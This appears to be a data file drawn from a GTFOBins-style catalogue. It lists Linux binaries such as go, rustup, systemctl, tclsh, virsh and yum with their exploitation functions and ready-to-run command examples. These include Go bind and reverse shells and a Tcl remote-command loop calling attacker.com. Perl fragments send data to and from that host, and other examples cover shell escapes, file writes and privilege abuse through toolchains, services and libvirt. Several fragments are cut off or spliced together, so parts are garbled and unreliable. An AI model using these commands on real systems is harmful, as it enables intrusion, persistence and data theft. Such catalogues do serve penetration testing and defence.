description: Linux binary 'gnuplot' with exploitation functions: shell
Linux binary 'go' with exploitation functions: bind-shell, file-read, file-write, reverse-shell, shell
command_examples:
echo -e 'package main
import (
	"os"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], []byte{0,0,0,0})
	syscall.Bind(fd, addr)
	syscall.Listen(fd, 1)
	nfd, _, _ := syscall.Accept(fd)
	syscall.Dup2(nfd, 0)
	syscall.Dup2(nfd, 1)
	syscall.Dup2(nfd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go

echo -e 'package main
import "os"
func main(){
	f, _ := os.OpenFile("/path/to/output-file", os.O_RDWR|os.O_CREATE, 0644)
	f.Write([]byte("DATA\n"))
	f.Close()
}' >/path/to/temp-file.go
go run /path/to/temp-file.go

echo -e 'package main
import (
	"os"
	"net"
	"syscall"
)

func main(){
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_STREAM, 0)
	ip := net.ParseIP("attacker.com").To4()
	addr := &syscall.SockaddrInet4{Port: 12345}
	copy(addr.Addr[:], ip)
	syscall.Connect(fd, addr)
	syscall.Dup2(fd, 0)
	syscall.Dup2(fd, 1)
	syscall.Dup2(fd, 2)
	syscall.Exec("/bin/sh", []string{"/bin/sh", "-i"}, os.Environ())
}' >/path/to/temp-file.go
go run /path/to/temp-file.go

Host: attacker.com
Metadata: true
Connection: close

"; open(my $fh, ">", "/path/to/output-file") or die; $in_content = 0; while (<$s>) { if ($in_content) { print $fh $_; } elsif ($_ eq "
") { $in_content = 1; } } close($s); close($fh);'

Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: " . length($content) . "
Connection: close

";print $s $headers . $content;while (<$s>) { }close($s);'

config set dbfilename output-file
set x "DATA"
save

description: Linux binary 'restic' with exploitation functions: command, shell, upload
Linux binary 'rev' with exploitation functions: file-read
Linux binary 'rlogin' with exploitation functions: upload
Linux binary 'rlwrap' with exploitation functions: file-write, shell
Linux binary 'rpm' with exploitation functions: command, inherit, shell
Linux binary 'rpmdb' with exploitation functions: inherit, shell
Linux binary 'rpmquery' with exploitation functions: inherit, shell
Linux binary 'rpmverify' with exploitation functions: inherit, shell
Linux binary 'rsync' with exploitation functions: shell
Linux binary 'rsyslogd' with exploitation functions: command
Linux binary 'rtorrent' with exploitation functions: shell
Linux binary 'ruby' with exploitation functions: download, file-read, file-write, library-load, reverse-shell, shell, upload
Linux binary 'run-mailcap' with exploitation functions: inherit
Linux binary 'run-parts' with exploitation functions: shell
Linux binary 'runscript' with exploitation functions: shell
Linux binary 'rustc' with exploitation functions: file-read, file-write, inherit
Linux binary 'rustdoc' with exploitation functions: file-read, file-write
Linux binary 'rustfmt' with exploitation functions: file-read
Linux binary 'rustup' with exploitation functions: command, shell
command_examples:
mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
echo '/path/to/command' >/path/to/temp-dir/bin/rustc
chmod +x /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc

mkdir /path/to/temp-dir/bin/
mkdir /path/to/temp-dir/lib/
cp /bin/sh /path/to/temp-dir/bin/rustc
rustup toolchain link x /path/to/temp-dir/
rustup run x rustc

command_examples:

Type=oneshot
ExecStart=/path/to/command
[Install]
WantedBy=multi-user.target' >/path/to/temp-file.service
systemctl link /path/to/temp-file.service
systemctl enable --now /path/to/temp-file.service

echo /bin/sh >/path/to/temp-file
chmod +x /path/to/temp-file
SYSTEMD_EDITOR=/path/to/temp-file systemctl edit basic.target

tar Pxf /path/to/temp-file.tar --xform s@.*@/path/to/output-file@

tclsh
set s [socket attacker.com 12345];while 1 { puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;

Linux binary 'vim' with exploitation functions: file-read, inherit
Linux binary 'vimdiff'
Linux binary 'vipw' with exploitation functions: inherit
Linux binary 'virsh' with exploitation functions: command, file-write
command_examples:
cat >/path/to/temp-file.xml <<EOF
<domain type='kvm'>
  <name>x</name>
  <os>
    <type arch='x86_64'>hvm</type>
  </os>
  <memory unit='KiB'>1</memory>
  <devices>
    <interface type='ethernet'>
      <script path='/path/to/command'/>
    </interface>
  </devices>
</domain>
EOF
virsh -c qemu:///system create /path/to/temp-file.xml
virsh -c qemu:///system destroy x

echo DATA >/path/to/temp-file

cat >/path/to/temp-file.xml <<EOF
<volume type='file'>
  <name>y</name>
  <key>/path/to/output-dir/output-file</key>
  <source>
  </source>
  <capacity unit='bytes'>5</capacity>
  <allocation unit='bytes'>4096</allocation>
  <physical unit='bytes'>5</physical>
  <target>
    <path>/path/to/output-dir/output-file</path>
    <format type='raw'/>
    <permissions>
      <mode>0600</mode>
      <owner>0</owner>
      <group>0</group>
    </permissions>
  </target>
</volume>
EOF

virsh -c qemu:///system pool-create-as x dir --target /path/to/output-dir/
virsh -c qemu:///system vol-create --pool x --file /path/to/temp-file.xml
virsh -c qemu:///system vol-upload --pool x /path/to/output-dir/output-file /path/to/temp-file
virsh -c qemu:///system pool-destroy x

virsh -c qemu:///system pool-create-as x dir --target /path/to/dir/
virsh -c qemu:///system vol-download --pool x input-file output-file
virsh -c qemu:///system pool-destroy x

Linux binary 'yum' with exploitation functions: command, download, inherit
command_examples:
cat >/path/to/temp-dir/x<<EOF
[main]
plugins=1
pluginpath=/path/to/temp-dir/
pluginconfpath=/path/to/temp-dir/
EOF

cat >/path/to/temp-dir/y.conf<<EOF
[main]
enabled=1
EOF

cat >/path/to/temp-dir/y.py<<EOF
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  ...
EOF

yum -c /path/to/temp-dir/x --enableplugin=y
